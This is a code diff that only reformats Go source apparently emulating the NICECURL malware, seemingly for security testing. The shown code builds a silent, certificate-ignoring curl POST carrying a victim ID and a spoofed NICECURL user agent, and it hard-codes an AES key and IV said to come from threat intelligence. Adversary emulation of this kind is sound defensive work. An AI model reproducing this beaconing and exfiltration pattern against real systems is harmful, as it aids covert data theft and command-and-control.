@@ -181,11 +181,11 @@ func performTechnique() error {
 		// -X POST with base64-encoded data
 		// -H with custom headers
 		cmd := exec.Command(curlPath,
-			"-s",                       // Silent mode
-			"-k",                       // Allow self-signed certs (NICECURL does this)
-			"--connect-timeout", "5",   // Short timeout (will fail on non-existent domain)
-			"--max-time", "8",          // Max total time
-			"-X", "POST",              // POST method
+			"-s",                     // Silent mode
+			"-k",                     // Allow self-signed certs (NICECURL does this)
+			"--connect-timeout", "5", // Short timeout (will fail on non-existent domain)
+			"--max-time", "8", // Max total time
+			"-X", "POST", // POST method
 			"-H", "Content-Type: application/x-www-form-urlencoded",
 			"-H", fmt.Sprintf("X-Request-ID: %s", victimID),
 			"-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) NICECURL/2.0",
@@ -268,7 +268,7 @@ func bitwiseNOT(data []byte) []byte {
 func encryptAESCBC(plaintext []byte) ([]byte, error) {
 	// Hard-coded key and IV from NICECURL threat intelligence
 	key := []byte("kNz0CXiP0wEQnhZXYbvraigXvRVYHk1B") // 32 bytes = AES-256
-	iv := []byte("0T9r1y1M2e0N0o1w")                     // 16 bytes IV
+	iv := []byte("0T9r1y1M2e0N0o1w")                  // 16 bytes IV
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
